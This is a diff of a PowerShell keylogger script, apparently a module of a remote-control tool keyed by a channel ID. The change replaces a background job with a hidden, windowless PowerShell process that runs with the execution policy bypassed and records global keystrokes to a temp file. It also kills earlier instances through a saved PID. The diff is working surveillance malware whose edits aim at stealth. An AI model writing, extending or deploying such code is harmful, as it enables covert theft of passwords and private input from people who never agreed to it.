@@ -2,12 +2,19 @@ param($args)
 
 $channelID = $env:ChannelID
 $logFile = "$env:TEMP\keylog_$channelID.txt"
-$jobName = "Keylogger_$channelID"
+$pidFile = "$env:TEMP\keylog_pid_$channelID.txt"
+$workerScript = "$env:TEMP\keylog_worker_$channelID.ps1"
 
-# Check if a job with this name already exists and remove it
-Get-Job -Name $jobName -ErrorAction SilentlyContinue | Stop-Job -PassThru | Remove-Job
+# Kill any previous keylogger process for this channel
+if (Test-Path $pidFile) {
+    $oldPid = Get-Content $pidFile
+    Stop-Process -Id $oldPid -Force -ErrorAction SilentlyContinue
+    Remove-Item $pidFile -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Milliseconds 500
+}
 
-# C# code for global keyboard hook (simplified, reliable version)
+# Worker script content (actual keylogger)
+$workerContent = @'
 $cSharpCode = @"
 using System;
 using System.Diagnostics;
@@ -90,20 +97,26 @@ public class Keylogger
     private static extern IntPtr GetModuleHandle(string lpModuleName);
 }
 "@
-
-# Script block that will run in the background job
-$jobScript = {
-    param($cSharpCode, $logFile)
-    Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms"
-    [Keylogger]::Start($logFile)
-    # Keep the job alive
-    while ($true) { Start-Sleep -Seconds 10 }
+Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms"
+$logFile = "$env:TEMP\keylog_$env:ChannelID.txt"
+[Keylogger]::Start($logFile)
+while($true) {
+    Start-Sleep -Seconds 10
 }
+'@
 
-# Start the job
-$job = Start-Job -Name $jobName -ScriptBlock $jobScript -ArgumentList $cSharpCode, $logFile
+# Write worker script to temp file (overwrite if exists)
+$workerContent | Out-File -FilePath $workerScript -Encoding utf8 -Force
 
-# Save job instance info (optional, for reference)
-$job.Id | Out-File "$env:TEMP\keylog_job_$channelID.txt"
+# Launch worker in hidden PowerShell window
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "powershell.exe"
+$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$workerScript`""
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi.CreateNoWindow = $true
+$p = [System.Diagnostics.Process]::Start($psi)
 
-Write-Output "Keylogger started with Job ID $($job.Id). Logging to $logFile"
+# Save PID
+$p.Id | Out-File -FilePath $pidFile -Force
+
+Write-Output "Keylogger started with PID $($p.Id). Logging to $logFile"
